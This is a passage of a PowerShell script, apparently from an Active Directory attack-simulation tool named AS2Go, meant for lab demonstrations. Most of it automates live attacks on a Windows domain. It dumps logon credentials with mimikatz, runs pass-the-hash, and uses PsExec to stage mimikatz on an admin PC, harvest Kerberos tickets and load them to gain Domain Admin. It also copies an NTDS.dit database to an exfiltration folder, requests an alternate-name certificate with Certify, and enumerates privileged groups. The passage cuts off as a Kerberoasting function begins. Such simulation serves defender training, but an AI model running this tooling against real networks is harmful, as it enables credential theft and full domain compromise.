    Write-Log -Message "### Start Function $myfunction ###"
    #region ################## main code | out- host #####################

    [XML]$AS2GoConfig = Get-Content $configFile
    $MyKey = $AS2GoConfig.Config.DefaultParameter.ChildNodes | Where-Object Name -EQ $key
    $MyKey.value = $NewValue
    $AS2GoConfig.Save($configFile)

    Write-Log -Message "    >> update $key with value $($MyKey.value)"
    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"

}

Function Set-NewColorSchema {

    Param(
        [Parameter(Mandatory = $True)]
        [string]
        $NewStage)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #####

    <#

Powershell color names are:

Black   White
Gray    DarkGray
Red     DarkRed
Blue    DarkBlue
Green   DarkGreen
Yellow  DarkYellow
Cyan    DarkCyan
Magenta DarkMagenta

Set-NewBackgroundColor -BgC "Blue" -FgC "White"

#>



    If ($NewStage -eq $PtH) {
        
        $global:FGCCommand = "Green"
        $global:FGCQuestion = "Yellow"
        $global:FGCHighLight = "Darkblue"
        $global:FGCError = "DarkBlue"
        
        Set-NewBackgroundColor -BgC "DarkBlue" -FgC "White"

        #      Write-Host -BackgroundColor 


    }
    elseif ($NewStage -eq $PtT) {
        
        $global:FGCCommand = "Green"
        $global:FGCQuestion = "Yellow"
        $global:FGCHighLight = "Yellow"
        $global:FGCError = "Red"
        
        Set-NewBackgroundColor -BgC "Black" -FgC "White"
    }
    elseif ($NewStage -eq $GoldenTicket) {
        $global:FGCCommand = "Green"
        $global:FGCQuestion = "Yellow"
        $global:FGCHighLight = "Yellow"
        $global:FGCError = "Black"
        
        Set-NewBackgroundColor -BgC "DarkRed" -FgC "White"
    }
    else {
        $global:FGCCommand = "GREEN"
        $global:FGCQuestion = "YELLOW"
        $global:FGCHighLight = "YELLOW" 
        $global:FGCError = "RED"
        Set-NewBackgroundColor -BgC "Black" -FgC "Gray"
    }

    Write-Log -Message "    >> Set Color Schema for $NewStage"
    #####
    Write-Log -Message "### End Function $myfunction ###"




}

Function Set-NewBackgroundColor {

    Param(
        [Parameter(Mandatory = $True)]
        [string]
        $BgC,

        [Parameter(Mandatory = $True)]
        [string]
        $FgC)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #####

    $a = (Get-Host).UI.RawUI
    $a.BackgroundColor = $BgC
    $a.ForegroundColor = $FgC ; Clear-Host

    Write-Log -Message "    >> New Color Set $Bgc and $Fgc"


    #####
    Write-Log -Message "### End Function $myfunction ###"

    <#

Powershell color names are:

Black White
Gray DarkGray
Red DarkRed
Blue DarkBlue
Green DarkGreen
Yellow DarkYellow
Cyan DarkCyan
Magenta DarkMagenta

Set-NewBackgroundColor -BgC "Blue" -FgC "White"

#>


}

function Set-StandCommandColors {

    ################################################################################
    #####                                                                      ##### 
    #####    Description                ######                                 
    #####                                                                      #####
    ################################################################################


    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ################## main code | out- host #####################

    #Color Schema for the next command
    $fgcS = "DarkGray" # Switch
    $fgcC = "Yellow"   # Command
    $fgcV = "DarkCyan" # Value
    [string] $fgcF = (get-host).ui.rawui.ForegroundColor
    If ($fgcF -eq "-1") { $fgcF = "White" }
    $fgcH = "Yellow" 

    Write-Log -Message "    >> using $CAtemplate"
    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"

    return $true
}

Function Set-ProgressBar {
    Param ([int] $Step, [int] $TotalSteps, [string] $User)
    $progress = [int] (($Step - 1) / $TotalSteps * 100)
    Write-Progress -Activity "Run Password Spray against user $User" -status "Completed $progress % of Password Spray Attack" -PercentComplete $progress
}


function Start-Exfiltration {

    If ($showStep) { Show-Step step_010.html }

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #####
    Write-Host ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "net ", "view ", "\\$mydc" `
        -Color $fgcC, $fgcF, $fgcV
    Write-Host ""
    
    Invoke-Command -ScriptBlock { net view $env:LOGONSERVER } | Out-Host

    If ($UnAttended) { Start-Sleep 2 } else { Pause }

    Get-DirContent -Path $OfflineDITFile

    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host "             try to open cmd console on $myAppServer"
    Write-Host "____________________________________________________________________`n" 

    Write-Host ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "Start-Process ", ".\PsExec.exe ", "-ArgumentList ", """\\$myAppServer -accepteula cmd.exe""" `
        -Color $fgcC, $fgcF, $fgcS, $fgcV
    Write-Host ""

    try {
        Write-Output "more C:\temp\as2go\my-passwords.txt" | Set-Clipboard
    }
    catch {
        Write-Output "more C:\temp\as2go\my-passwords.txt" | clip
    }


    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    Start-Process .\PsExec.exe -ArgumentList "\\$myAppServer -accepteula cmd.exe"
    write-host ""
    write-host ""
    write-host " Try to find some sensitive data, e.g. files with passwords" 
    Write-Host ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "more ", "C:\temp\as2go\my-passwords.txt" `
        -Color $fgcC, $fgcV
    Write-Host ""

    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    Clear-Host

    If ($showStep) { Show-Step step_011.html }
    Update-WindowTitle -NewTitle $stage35
    Set-KeyValue -key "LastStage" -NewValue $stage35

    Write-Host "____________________________________________________________________`n" 
    Write-Host "                  Data exfiltration over SMB Share                  "
    Write-Host "____________________________________________________________________`n" 
    
    New-Item $exfiltration -ItemType directory -ErrorAction Ignore
    
    Write-Host ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "Copy-Item ", "-Path ", "$OfflineDITFile\*.* ", " -Destination ", "$exfiltration" `
        -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV
    Write-Host ""

    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    Copy-Item -Path $OfflineDITFile\*.* -Destination $exfiltration
    Write-Host ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "Get-Item ", "-Path ", "$exfiltration\*.dit" `
        -Color $fgcC, $fgcS, $fgcV
    Write-Host ""

    Get-Item -Path "$exfiltration\*.dit" | Out-Host
    If ($UnAttended) { Start-Sleep 2 } else { Pause }

    #####
    Write-Log -Message "### End Function $myfunction ###"
}

function Start-PtHAttack {

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #####
    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host "           Starting Pass-the-Hash (PtH) Attack on VictimPC          "
    Write-Host "____________________________________________________________________`n" 
    Write-Host "____________________________________________________________________`n" 
    Write-Host "              Try to find a PRIVILEDGE account                      " 
    Write-Host "              e.g. member of Helpdesk Group                         " 
    Write-Host "____________________________________________________________________`n" 
    Write-Host ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "Get-LocalGroupMember ", "-Group ", """Administrators""", " |", " Format-Table" `
        -Color    $fgcC, $fgcS, $fgcV, $fgcS, $fgcC
    Write-Host ""
    Write-Host ""
    Get-LocalGroupMember -Group "Administrators" | Format-Table
    Write-Host ""
    Write-Host ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "Get-ADGroupMember ", "-Identity ", $globalHelpDesk, " -Recursive |", " Format-Table" `
        -Color    $fgcC, $fgcS, $fgcV, $fgcS, $fgcC  
    Write-Host ""
    Get-SensitveADUser -group $globalHelpDesk
    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    If ($showStep) { Show-Step -step "step_poi.html" }
    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    Clear-Host

    Write-Host "____________________________________________________________________`n" 
    Write-Host "  Try to list all recently logged-on user credentials from VictimPC          " 
    Write-Host "____________________________________________________________________`n" 
    Write-Host ""
    $logfile = "$helpdeskuser.log"
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text ".\mimikatz.exe ", """log .\", $logfile, """ ""privilege::", "debug", """ ""sekurlsa::", "logonpasswords", """ ""exit"""   `
        -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS
    Write-Host ""
    
    If ($UnAttended) {
        $answer = $yes       
    }
    else {
        $question = "Do you want to run this step - Y or N? Default "
        $answer = Get-Answer -question $question -defaultValue $Yes
    }

    If ($answer -eq $yes) {
        #Invoke-Expression -Command:$command
        Invoke-Command -ScriptBlock { .\mimikatz.exe "log .\$logfile" "privilege::debug" "sekurlsa::logonpasswords" "exit" }
        Invoke-Item ".\$helpdeskuser.log"
        If ($UnAttended) { Start-Sleep 2 } else { Pause }
    }
    else {
        Write-Log "Skipped - Try to Dump Credentials In-Memory from VictimPC"
        return
    }

    Do {
        Clear-Host
        Write-Host "____________________________________________________________________`n" 
        Write-Host "                   overpass-the-Hash 'PtH' attack                   "
        Write-Host "____________________________________________________________________`n" 
        Write-Host ""
        Write-Host "  Compromised User Account - " -NoNewline; Write-Host $helpdeskuser -ForegroundColor $fgcC
        Write-Host "  NTML Hash                - " -NoNewline; Write-Host $pthntml      -ForegroundColor $fgcC
        Write-Host ""
        Write-Host      -NoNewline "  Command: "
        Write-Highlight -Text ".\mimikatz.exe ", """privilege::", "debug", """ ""sekurlsa::", "pth", " /user:", $helpdeskuser , " /ntlm:", $pthntml, " /domain:", $fqdn, """ ""exit"""   `
            -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS
        Write-Host ""

        If ($UnAttended) {
            $prompt = $yes
        }
        else {
            $question = "Are these values correct - Y or N? Default "
            $prompt = Get-Answer -question $question -defaultValue $yes
        }

    
        if ($prompt -ne $yes) {

            $question = " -> Is this user $helpdeskuser  correct - Y or N? Default "
            $prompt = Get-Answer -question $question -defaultValue $yes
    
            if ($prompt -ne $yes) {
                $helpdeskuser = Read-Host "New PtH Victim"
            }
 
  
            $question = " -> Is this NTLH HASH for $helpdeskuser  correct - Y or N? Default "
            $prompt = Get-Answer -question $question -defaultValue $yes
    
            if ($prompt -ne $yes) {
                $pthntml = Read-Host "New NTML Hash for $helpdeskuser"
                Set-KeyValue -key "pthntml" -NewValue $pthntml
            }


        }

    } Until ($prompt -eq $yes)


    Invoke-Command -ScriptBlock { .\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:$helpdeskuser /ntlm:$pthntml /domain:$fqdn" "exit" }


    Write-Host "____________________________________________________________________`n" -ForegroundColor Red
    Write-Host "     #            use                                         #     "   -ForegroundColor Red
    Write-Host "     #                the                                     #     "   -ForegroundColor Red
    Write-Host "     #                    new                                 #     "   -ForegroundColor Red
    Write-Host "     #                        DOS                             #     "   -ForegroundColor Red
    Write-Host "     #                            window                      #     "   -ForegroundColor Red
    Write-Host "____________________________________________________________________`n" -ForegroundColor Red


    Write-Host "`n`nPlease run the following command from the new Terminal Window:`n" -ForegroundColor $global:FGCQuestion
    Write-Host "             00.cmd" -ForegroundColor $fgcC
    Write-Host ""
    Set-KeyValue -key "LastStage" -NewValue $stage20

    Stop-Process -ErrorAction SilentlyContinue -Name iexplore -Force 
    Stop-Process -ErrorAction SilentlyContinue -Name msedge -Force 

    #####
    Write-Log -Message "### End Function $myfunction ###"
    Pause
}

function Start-PtTAttack {
    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #####
    $hostname = $env:computername
    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host "           Try to run a Pass-the-Ticket 'PtT' attack                          "
    Write-Host "____________________________________________________________________`n" 
    Write-Host " NEXT STEPS ARE: "
    Write-Host "                                                                    "
    Write-Host "      Step #1 - stage mimikatz on Admin PC"
    Write-Host "      Step #2 - harvest tickets on Admin PC"
    Write-Host "      Step #3 - run PtT to become Domain Admin"
    Write-host ""
    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    Clear-Host
    # remove all old tickets
    Try {
        #Get-Item \\$hostname\$ticketsUNCPath\*.kirbi
        Remove-Item \\$hostname\$ticketsUNCPath\*.kirbi
        #Get-Item \\$hostname\$ticketsUNCPath\*.kirbi 
        Remove-Item -Recurse \\$mySAW\$ticketsUNCPath -ErrorAction SilentlyContinue
    }
    Catch {
    }


    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host "           stage mimikatz on Admin PC $mySAW                        "  
    Write-Host "____________________________________________________________________`n" 
    write-host ""

    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "Copy-Item ", "-Path ", ".\mimikatz.exe ", " -Destination ", "\\$mySAW\$ticketsUNCPath", " -Recurse"   `
        -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS
    Write-Host  ""
    #cleanup
    Remove-Item -Recurse \\$mySAW\$ticketsUNCPath -ErrorAction Ignore
    New-Item \\$mySAW\$ticketsUNCPath -ItemType directory -ErrorAction Ignore | Out-Null
    Copy-Item -Path ".\mimikatz.exe" -Destination \\$mySAW\$ticketsUNCPath -Recurse
    $files = "\\$mySAW\$ticketsUNCPath\*.exe"
    Get-Item $files | Out-Host

    If ($UnAttended) { Start-Sleep 2 } else { Pause }

    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host "           harvest tickets on Admin PC $mySAW                      "
    Write-Host "____________________________________________________________________`n" 
    Write-Host ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "PsExec.exe ", "\\$mySAW ", "-accepteula ", "cmd /c ", "('cd c:\temp\tickets & mimikatz.exe ""privilege::debug"" ""sekurlsa::tickets /export""  ""exit""')"  `
        -Color $fgcC, $fgcV, $fgcS, $fgcC, $fgcV
    Write-Host  ""
    Invoke-Command -ScriptBlock { .\PsExec.exe \\$mySAW -accepteula cmd /c ('cd c:\temp\tickets & mimikatz.exe "privilege::debug" "sekurlsa::tickets /export"  "exit"') }
    If ($UnAttended) { Start-Sleep 2 } else { Pause }

    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host "            list tickets on Admin PC $mySAW                        "
    Write-Host "____________________________________________________________________`n" 
    write-host ""

    $files = "\\$mySAW\$ticketsUNCPath\*.kirbi"

    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "Get-Item ", $files, " -Force ", "| Out-Host "  `
        -Color $fgcC, $fgcV, $fgcS, $fgcC
    Write-Host  ""

    Get-Item $files -Force | Out-Host
    If ($UnAttended) { Start-Sleep 2 } else { Pause }

    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host "  copy $domainadmin tickets from Admin PC '$mySAW' to Victim PC "
    Write-Host "____________________________________________________________________`n" 
    write-host ""
    New-Item \\$hostname\$ticketsUNCPath -ItemType directory -ErrorAction Ignore
    Get-Item \\$mySAW\$ticketsUNCPath\*$domainadmin* | Copy-Item -Destination \\$hostname\$ticketsUNCPath

    $files = "\\$hostname\$ticketsUNCPath\*.kirbi"
    Get-Item $files | Out-Host

    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    Remove-Item -Recurse \\$mySAW\$ticketsUNCPath
    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    write-host "     load stolen tickets from $domainadmin on VictimPC"
    write-host "                    to become a Domain Admin"
    Write-Host "____________________________________________________________________`n" 
    Write-Host  ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text ".\mimikatz.exe ", """privilege::debug"" ""kerberos::ptt", " \\$hostname\$ticketsUNCPath", """ ""exit"""   `
        -Color $fgcC, $fgcS, $fgcV, $fgcS
    Write-Host  ""

    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    Clear-Host
    Invoke-Command -ScriptBlock { .\mimikatz.exe "privilege::debug" "kerberos::ptt \\$hostname\$ticketsUNCPath" "exit" }
    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host "       Displays a list of currently cached Kerberos tickets         "
    Write-Host "____________________________________________________________________`n" 
    Write-Host  ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "klist" `
        -Color $fgcC
    Write-Host  ""
    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    write-host ""
    Set-KeyValue -key "LastStage" -NewValue $PtT
    Set-NewColorSchema -NewStage $PtT

    
    klist
    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host "                 2nd TRY connect to DCs c$ share                    "   
    Write-Host "____________________________________________________________________`n" 
    write-host ""

    $directory = "\\$myDC\c$"
    Get-DirContent -Path $directory
    If ($UnAttended) { Start-Sleep 2 } else { Pause }

    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host "        2nd TRY to list NetBIOS sessions on Domain Controller       "
    Write-Host "____________________________________________________________________`n" 
    write-host ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text ".\NetSess.exe ", "$mydc" `
        -Color $fgcC, $fgcV
    Write-Host  ""


    Start-NetSess -server $mydc
    If ($UnAttended) { Start-Sleep 2 } else { Pause }

    #####
    Write-Log -Message "### End Function $myfunction ###"
}

function Start-NetSess {

    Param([string]$server)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #####

    Invoke-Command -ScriptBlock { .\NetSess.exe $server }
    #####
    Write-Log -Message "### End Function $myfunction ###"
}

function Start-Reconnaissance {
    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    ####
    Write-Host "____________________________________________________________________`n" 
    Write-Host "       TRY to enumerate the members of the Domain Admins Group      "
    Write-Host "____________________________________________________________________`n`n" 
  
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "Get-ADGroupMember ", "-Identity """, $GroupDA, """ -Recursive |", " Format-Table" `
        -Color    $fgcC, $fgcS, $fgcV, $fgcS, $fgcC  

    
    Get-SensitveADUser -group $GroupDA

    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host "       TRY to find Domain COMPUTER and connect to one c$ share      "
    Write-Host "____________________________________________________________________`n`n" 

    
    Write-Host -NoNewline "  Command: "
    Write-Highlight -Text ("Get-ADComputer ", "-Filter * | ", "Format-Table", " Name, Enabled, OperatingSystem, DistinguishedName") -Color $fgcC, $fgcS, $fgcC, $fgcV
    #Write-Host "Get-ADComputer -Filter * | ft Name, Enabled, DistinguishedName" -ForegroundColor $global:FGCCommand
    Write-Host ""

    # enumerate all computer accounts 
    $attributes = @("Name", "Enabled", "OperatingSystem", "DistinguishedName", "lastLogondate")
    try{
        #Get-ADComputer -Filter * -Properties $attributes | Select-Object -Property $attributes | Format-Table
        Get-ADComputer -Filter * -properties $attributes | Sort-Object lastlogondate -Descending | Select-Object -First 20 | Format-Table Name, Enabled, OperatingSystem, DistinguishedName, lastlogondate
    }
    catch{
        write-host "Error: " -NoNewline -ForegroundColor Red
        Write-Host $_
    }


    Write-Host ""
    $directory = "\\$mySAW\c$"
    Get-DirContent -Path $directory

    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host "            TRY to find DC's and connect to one c$ share            "
    Write-Host "____________________________________________________________________`n`n" 
    
    Write-Host -NoNewline "  Command: "
    Write-Highlight -Text ("Get-ADDomainController ", "-filter * | ", "ft ", "hostname, IPv4Address, ISReadOnly, IsGlobalCatalog, site, ComputerObjectDN") -Color $fgcC, $fgcS, $fgcC, $fgcV

    #Write-Host "Get-ADDomainController -filter *| ft hostname, IPv4Address, ISReadOnly, IsGlobalCatalog, site, ComputerObjectDN" -ForegroundColor $global:FGCCommand
    
    Write-Host ""
    Get-ADDomainController -filter * | Format-Table hostname, IPv4Address, ISReadOnly, IsGlobalCatalog, site, ComputerObjectDN
    Write-Host ""
    #workaround
    $directory = "\\$myDC\c$"
    Get-DirContent -Path $directory
    Write-Host ""
    Write-Host ""
    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    ####
    Write-Log -Message "### End Function $myfunction ###"
}

function Start-ReconnaissanceExtended {
    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    ####
    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host "TRY to enumerate the members of the Group Policy Creator Owners group         "
    Write-Host "____________________________________________________________________`n" 

    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text ("Get-ADGroupMember ", "-Identity ", "'Group Policy Creator Owners' ", "-Recursive | ", "FT") `
        -Color $fgcC, $fgcS, $fgcV, $fgcC, $fgcS
    #Write-Host " Get-ADGroupMember -Identity 'Group Policy Creator Owners' -Recursive | ft" -ForegroundColor $global:FGCCommand
    Write-Host ""
    Get-SensitveADUser -group $GroupGPO
    Write-Host ""
    Write-Host ""
    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host "            TRY to enumerate all Enterprise Admins              "
    Write-Host "____________________________________________________________________`n" 
    
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text ("Get-ADGroupMember ", "-Identity ", "'Enterprise Admins' ", "-Recursive | ", "FT") `
        -Color $fgcC, $fgcS, $fgcV, $fgcC, $fgcS
    
    #Write-Host " Get-ADGroupMember -Identity 'Enterprise Admins' -Recursive | ft" -ForegroundColor $global:FGCCommand
    Write-Host ""
    Get-SensitveADUser -group $GroupEA
    Write-Host ""
    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host "            open new window for Domain Zone Transfer                "
    Write-Host "____________________________________________________________________`n" 
    write-host ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "nslookup | ", "ls ", "-d ", "$fqdn" `
        -Color $fgcC, $fgcC, $fgcS, $fgcV
    Write-Host  ""

    try {
        Write-Output "ls -d $fqdn" | Set-Clipboard
    }
    catch {
        Write-Output "ls -d $fqdn" | clip
    }


    Start-Process nslookup
    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host "          TRY to list NetBIOS sessions on Domain Controller         "
    Write-Host "____________________________________________________________________`n" 
    Write-Host ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text ".\NetSess.exe ", "$mydc" `
        -Color $fgcC, $fgcV
    Write-Host  ""
    Write-Host ""
    Start-NetSess -server $mydc
    Write-Host ""
    Write-Host ""

    ### hidden alert ####
    New-HoneytokenActivity
    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    ####
    Write-Log -Message "### End Function $myfunction ###"
}

function Start-ConvertingToPfxFromPem {

    ################################################################################
    #####                                                                      ##### 
    #####             Converting to PFX from PEM via OpenSSL                   #####
    #####                                                                      #####
    ################################################################################


    Param([string] $pemFile)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ################## main code | out- host #####################

    Write-Log -Message  $pemFile
    
    
    $PfxFile = $pemFile.tolower().Replace("pem", "pfx")


    Write-Log -Message  $PfxFile


    If ($pfxFile.Contains("\")) {
        $temp = $pfxFile.Split(" ")
        $pfxFile = $temp[-1]
    }

    If ($pemFile.Contains("\")) {
        $temp = $pemFile.Split(" ")
        $pemFile = $temp[-1]
    }


    $convert = "openssl pkcs12 -in $pemFile -keyex -CSP ""Microsoft Enhanced Cryptographic Provider v1.0"" -export -out $pfxFile"
    Write-Log -Message  $convert


    # example: openssl pkcs12 -in $pemFile -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out $pfxFile
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "openssl ", "pkcs12 ", "-in ", $pemFile, " -keyex -CSP ", """Microsoft Enhanced Cryptographic Provider v1.0""", " -export -out ", $pfxFile `
        -Color $fgcC, $fgcF, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV
    Write-Host ""
    
    $question = "Do you want to run this task - Y or N? Default "
    $answer = Get-Answer -question $question -defaultValue $yes

    If ($answer -ne $yes) {return $PfxFile}

    try {
        Write-Output $convert  | Set-Clipboard
    }
    catch {
        Write-Output $convert  | clip
    }
 
    Write-Host ""
    Write-Host "Next steps:" -ForegroundColor $fgcH
    Write-Host "-----------" -ForegroundColor $fgcH
    Write-Host ""
    Write-Host " - Change to console "  -NoNewline; Write-Host "Win64 OpenSSL Command Prompt" -ForegroundColor $fgcH
    Write-Host " - Change directory to C:\temp\AS2Go"
    Write-Host " - Paste the command into the OpenSSL Command Prompt"
    Write-Host " - Save the pfx file with " -NoNewline
    Write-Host "NO " -NoNewline  -ForegroundColor $fgcH; Write-Host "export password"
    Write-Host " - Change back to console " -NoNewline; Write-Host $stage25 -ForegroundColor $fgcH
    Write-Host ""

    Pause
    $StartOpenSSL = Get-KeyValue -key "OpenSSL"
    Start-Process -filePath $StartOpenSSL

    Start-Sleep -Milliseconds 1500
    Get-Process -name cmd | Format-Table name, id, mainWindowTitle | Out-Host
    pause

    write-host "`n  Saved to file:" -ForegroundColor $fgcH
    Get-Item $pfxFile | Out-Host
    
    #stop 
    $ProcessObject = Get-Process -name cmd | Where-Object { $_.mainWindowTitle -eq "" }
    Stop-Process -InputObject $ProcessObject

    Write-Log -Message "    >> using $PfxFile"
    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"

    return $PfxFile
}

function Start-RequestingCertificate {

    ################################################################################
    #####                                                                      ##### 
    #####                 Requesting Certificate with Certify                  #####                            
    #####                                                                      #####
    ################################################################################


    Param([string] $myEntCA, [string] $CAtemplate, [string] $altname, [bool] $domainComputer)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ################## main code | out- host #####################


    $pemFile = "$altname.pem".ToLower()

    # example:  Command: .\certify.exe request /ca:NUC-DC01.SANDBOX.CORP\AS2GO-CA /template:AS2Go /altname:DA-HERRHOZI
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text ".\certify.exe ", "request ", "/ca:", $myEntCA, " /template:", $CAtemplate, " /altname:", $altname    `
        -Color $fgcC, $fgcF, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV
    Write-Host ""
    Write-Log -Message "     >> .\certify.exe request /ca:$myEntCA /template:$CAtemplate /altname:$altname"


#hiergehtesweiter

    $hostname = $env:COMPUTERNAME

    If ($domainComputer -eq $true) {

        Write-Host "`n`n  Domain Computers " -ForegroundColor Yellow -NoNewline
        Write-Host "can enroll your selected template - " -NoNewline
        Write-Host "$CAtemplate" -ForegroundColor Yellow -NoNewline
        Write-Host "? Do you want to add the parameter - " -NoNewline
        Write-host "/machine`n" -ForegroundColor Yellow

        Write-Host      -NoNewline "  Command: "
        Write-Highlight -Text ".\certify.exe ", "request ", "/ca:", $myEntCA, " /template:", $CAtemplate, " /altname:", $altname, " /machine:", $hostname    `
            -Color $fgcS, $fgcS, $fgcS, $fgcS, $fgcS, $fgcS, $fgcS, $fgcS, $fgcF, $fgcV
        
        $question = "Press - Y or N? Default "
        $answer = Get-Answer -question $question -defaultValue $yes

        IF ($answer = "R") {}
     }


    $question = "Do you want to run this step - Y or N? Default "
    $answer = Get-Answer -question $question -defaultValue $yes

    If ($answer -eq $yes) {

        $text = "Copy the certificate content printed out by certify and paste it into this file!"

        if (!(Test-Path $pemFile)) {
            New-Item -path . -name $pemFile -type "file" -value $text
        }
        else {
            Set-Content -path $pemFile -value $text
        }

        # more content to this file
        Add-Content -path .\$pemFile -value "Save this file"
        Add-Content -path .\$pemFile -value "Please remove these lines before!"

        #Check connection to Enterprise CA
        $result = certutil -config $myEntCA -ping

        #Request a Certificates
        If ($result[2].ToLower().Contains("successfully") -eq $True) {

            $result = Invoke-Command -ScriptBlock { .\certify.exe request /ca:$myEntCA /template:$CAtemplate /altname:$altname }
            $result | Out-Host

            $tempfile = ".\$altname.tmp"
            Set-Content -path $tempfile -value $result
            $FromHereStartingLine = Select-String $tempfile -pattern "-----BEGIN RSA PRIVATE KEY-----" | Select-Object LineNumber
            $UptoHereStartingLine = Select-String $tempfile -pattern "-----END CERTIFICATE-----" | Select-Object LineNumber

            $file = Get-Content  $tempfile
            # get the line numbers of text you want to extract from. For example, lines 1 and 32
            $inner = $file[($FromHereStartingLine.LineNumber - 2)]
            $outer = $file[($UptoHereStartingLine.LineNumber + 1)]

            # now we use the readcount property which is an int to loop through all the lines between and add to an array - $array
            $array = @()
            for ($i = ($inner.ReadCount); $i -lt ($outer.ReadCount - 1); $i++) {
                $array += $file[$i]
            }
            Set-Content -path .\$pemFile -value $array

            Invoke-Command -ScriptBlock { notepad .\$pemFile } | Out-host
            Write-Log -Message "The certificate retrieved is in a PEM format - $pemFile" 
        }
        else {
            Write-Host $result[1] -ForegroundColor red
            Write-Host $result[3]
            Write-Host $result[4]
        }
        pause
    }
    else {
        return $pemFile
    }
 
    write-host "`n  Saved to file:" -ForegroundColor $fgcH
    Get-Item $pemFile | Out-Host
    pause

    Write-Log -Message "    >> using $pemFile"
    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"

    return $pemFile
}

function Start-KerberoastingAttack {

    ################################################################################
    ######                                                                     #####
    ######                Kerberoasting Attack                                 #####
    ######                                                                     ##### 
    ######     technique used by attackers, which allows them to request       #####
    ######     a service ticket for any service with a registered SPN          #####
    ######                                                                     #####
    ################################################################################


    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #####

    $myDomain = $env:USERDNSDOMAIN
    $hashes = "KR-$myDomain.hashes.txt"


    # example: .\Rubeus.exe kerberoast /domain:SANDBOX.CORP /outfile:.\SANDBOX.CORP.hashes.txt
    Write-Host      -NoNewline "  Command: "
